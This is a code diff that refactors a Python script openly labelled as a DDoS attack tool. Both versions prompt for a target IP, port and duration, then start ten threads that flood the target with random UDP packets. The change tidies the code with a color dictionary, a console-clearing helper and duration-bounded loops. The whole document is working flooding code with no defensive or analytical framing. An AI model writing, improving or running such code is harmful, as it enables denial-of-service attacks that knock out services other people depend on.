@@ -8,65 +8,65 @@ import sys
 import threading
 import logging
 
-# Setting up logging
+# Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Defining colors for terminal output
-wi = "\033[1;37m"
-rd = "\033[0;31m"
-gr = "\033[1;32m"
-yl = "\033[1;33m"
-pu = "\033[1;35m"
+# Define colors for terminal output
+COLORS = {
+    "white": "\033[1;37m",
+    "red": "\033[0;31m",
+    "green": "\033[1;32m",
+    "yellow": "\033[1;33m",
+    "purple": "\033[1;35m"
+}
+
+def clear_console():
+    """Clear the console screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 def doss(ip, port, duration):
-    """Function to start the DDoS attack."""
+    """Start the DDoS attack."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payloads = random._urandom(10000)
-
-    os.system("clear")
-    logging.info("Starting DDoS attack on %s:%d for %d seconds.", ip, port, duration)
-
-    sent = 10
-    threads = []
+    payloads = random._urandom(1024)
     
-    # Creating multiple threads to send packets
-    for i in range(10):
-        t = threading.Thread(target=send_packets, args=(sock, payloads, ip, port))
+    clear_console()
+    logging.info(f"Starting DDoS attack on {ip}:{port} for {duration} seconds.")
+    
+    threads = []
+    start_time = time.time()
+
+    for _ in range(10):  # Create 10 threads
+        t = threading.Thread(target=send_packets, args=(sock, payloads, ip, port, duration, start_time))
         threads.append(t)
         t.start()
 
-    time.sleep(duration)
-
-    # Stopping the threads after the duration
     for t in threads:
         t.join()
 
-def send_packets(sock, payloads, ip, port):
-    """Thread function to continuously send packets to the target."""
-    while True:
+def send_packets(sock, payloads, ip, port, duration, start_time):
+    """Send packets to the target until duration expires."""
+    while time.time() - start_time < duration:
         try:
             sock.sendto(payloads, (ip, port))
-            logging.info('Attacking on %s:%d', ip, port)
         except socket.error as e:
-            logging.error('Socket error: %s', e)
+            logging.error(f"Socket error: {e}")
             break
-        except KeyboardInterrupt:
-            logging.info('Attack interrupted by user')
-            sys.exit()
         except Exception as e:
-            logging.error('Unexpected error: %s', e)
+            logging.error(f"Unexpected error: {e}")
             break
 
 def main():
-    """Main function to handle user input and start the attack."""
+    """Handle user input and initiate the attack."""
     try:
-        ip = input(yl + "[*] IP or Host Target: ")
-        port = int(input(wi + "[*] Port [Default port 80]: ") or 80)
-        duration = int(input(rd + "[*] Duration of the Attack (in seconds): "))
+        clear_console()
+        ip = input(COLORS["yellow"] + "[*] Enter IP or Host Target: " + COLORS["white"])
+        port = input(COLORS["yellow"] + "[*] Enter Port [Default: 80]: " + COLORS["white"])
+        port = int(port) if port else 80
+        duration = int(input(COLORS["red"] + "[*] Enter Duration (seconds): " + COLORS["white"]))
 
         doss(ip, port, duration)
     except ValueError:
-        logging.error("Invalid input. Please enter valid IP address, port, and duration.")
+        logging.error("Invalid input. Please enter valid data.")
     except KeyboardInterrupt:
         logging.info("Program interrupted by user.")
         sys.exit()
